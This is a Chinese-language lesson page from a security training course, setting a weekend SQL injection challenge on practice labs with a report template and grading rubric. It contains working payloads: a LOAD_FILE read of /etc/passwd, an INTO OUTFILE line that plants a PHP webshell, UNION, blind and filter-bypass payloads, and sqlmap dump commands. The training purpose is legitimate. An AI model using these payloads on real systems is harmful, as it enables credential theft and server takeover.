---
title: Day021：SQL 注入 - Week 3 周末闯关
tags:
  - 网络安全
  - SQL注入
  - 综合实战
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d021
date: 2026-02-12
updated: 2026-01-28
---

# Day021：SQL 注入 - Week 3 周末闯关

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 3：SQL 注入入门 |
| **今日主题** | 综合考核：SQL 注入全流程 |
| **预计时间** | 2-3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：本周你学了 SQL 注入的原理、手工注入、SQLMap、盲注、绕过技巧。现在是时候检验学习成果了。
>
> **问题**：能不能独立完成一次完整的 SQL 注入渗透？
>
> **今天的任务**：独立完成综合挑战，输出渗透报告。

---

## 今日目标

- [ ] 独立发现 SQL 注入漏洞
- [ ] 完成数据提取
- [ ] 尝试进阶利用
- [ ] 输出渗透测试报告

**闯关条件**：完成挑战并输出包含完整步骤的报告。

---

## 闯关任务

### 阶段 1：目标确认（10 分钟）

选择一个靶场环境：
- DVWA（设为 Medium 或 High）
- SQLi-Labs 任意关卡
- 其他 CTF 靶场

**记录**：
- 目标 URL：________________
- 靶场类型：________________

---

### 阶段 2：漏洞发现（20 分钟）

**任务**：找到 SQL 注入点

**检测步骤**：
1. 识别所有输入点
2. 逐个测试特殊字符
3. 观察响应差异
4. 确认存在注入

**记录**：
- 注入点位置：________________
- 确认 payload：________________
- 注入类型（数字/字符）：________________

---

### 阶段 3：信息收集（30 分钟）

**任务**：获取数据库基本信息

**目标信息**：
- [ ] 数据库类型和版本
- [ ] 当前数据库名
- [ ] 当前用户
- [ ] 所有数据库列表

**记录你使用的 payload**：
```sql
版本信息：
______________________________

数据库名：
______________________________

用户名：
______________________________
```

---

### 阶段 4：数据提取（45 分钟）

**任务**：获取敏感数据

**目标**：
- [ ] 获取目标库的所有表
- [ ] 获取用户表的结构
- [ ] 获取用户名和密码

**记录**：
```
表名列表：
______________________________

用户表结构：
______________________________

获取到的数据（前 3 条）：
______________________________
```

---

### 阶段 5：进阶尝试（30 分钟，可选）

根据时间和能力，尝试以下进阶任务：

**任务选择**（至少完成一项）：

- [ ] **读取服务器文件**
  ```sql
  UNION SELECT LOAD_FILE('/etc/passwd'),2 --
  ```

- [ ] **写入 Webshell**（需要权限）
  ```sql
  UNION SELECT '<?php system($_GET["cmd"]);?>',2 INTO OUTFILE '/var/www/html/shell.php' --
  ```

- [ ] **获取其他库的数据**

- [ ] **尝试绕过某种过滤**

**记录你的尝试**：
```
尝试的进阶任务：________________
结果：________________
```

---

### 阶段 6：撰写报告（30 分钟）

创建 `week3_sqli_report.md`，包含以下内容：

```markdown
# Week 3 SQL 注入渗透报告

## 1. 执行摘要
- 目标：[靶场名称]
- 发现的漏洞：SQL 注入
- 危害等级：高危
- 主要发现：[简述]

## 2. 测试范围
- 目标 URL：
- 测试时间：
- 使用工具：

## 3. 漏洞详情

### 3.1 注入点
- 位置：
- 类型：
- 参数：

### 3.2 利用过程
[详细步骤和 payload]

### 3.3 获取的数据
[脱敏后的数据样例]

## 4. 漏洞证明
[关键截图]

## 5. 风险评估
- 机密性影响：高（可获取所有用户数据）
- 完整性影响：中（可能可以修改数据）
- 可用性影响：低（可能导致查询异常）

## 6. 修复建议
1. 使用参数化查询/预编译语句
2. 实施输入验证
3. 使用 ORM 框架
4. 最小化数据库权限
5. 部署 WAF

## 7. 附录
- 使用的完整 payload 列表
- 工具命令
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 成功发现注入点 | 15 分 |
| 获取数据库版本和名称 | 15 分 |
| 获取表名 | 15 分 |
| 获取列名 | 15 分 |
| 获取用户数据 | 20 分 |
| 完成渗透报告 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## Week 3 总结

恭喜你完成了第三周的学习！

**你学会了**：
- SQL 注入的本质和原理
- 手工注入的完整流程
- SQLMap 自动化工具
- 盲注（布尔盲注、时间盲注）
- 绕过过滤和 WAF 的技巧

**你证明了**：
- 能独立检测 SQL 注入漏洞
- 能从检测到利用完成全流程
- 能处理不同类型的注入场景
- 能输出专业的渗透报告

---

## 知识点回顾

### Week 3 技术速查

```sql
-- 基础检测
'  ''  "  )  ))

-- UNION 注入
' UNION SELECT 1,2,3 --
' UNION SELECT user,password FROM users --

-- 盲注
' AND 1=1 --
' AND SUBSTRING(database(),1,1)='a' --
' AND IF(1=1, SLEEP(5), 0) --

-- 信息收集
version()
database()
user()
information_schema.tables
information_schema.columns

-- 绕过技巧
UnIoN SeLeCt
UN/**/ION SEL/**/ECT
%20 %09 %0a
```

### SQLMap 速查

```bash
# 基础扫描
sqlmap -u "URL" --cookie="COOKIE"

# 获取数据
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D dbname --tables
sqlmap -u "URL" -D dbname -T tablename --columns
sqlmap -u "URL" -D dbname -T tablename --dump

# 绕过
sqlmap -u "URL" --tamper=space2comment
```

---

## 下周预告

**Week 4：XSS 与文件上传**

下周你将学习：
- XSS 跨站脚本攻击
- 反射型、存储型、DOM 型 XSS
- 文件上传漏洞
- 绕过上传限制

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 3 总用时 | |
| 最大收获 | |
| 下周期待 | |

---

> **导师点评**：
>
> 第三周结束了。你从不知道 SQL 注入是什么，到现在能独立完成检测和利用。
>
> SQL 注入是 Web 安全的经典漏洞，虽然"老"，但依然有效。
>
> 这周学的不只是技术，更是**方法论**——遇到问题如何分析、如何一步步解决。
>
> 记住：**工具只是手段，思维才是武器**。
>
> 休息一下，Week 4 我们进入另一个经典领域——XSS！

```bash
echo "Week 3 Complete! SQL 注入入门成功！"
```
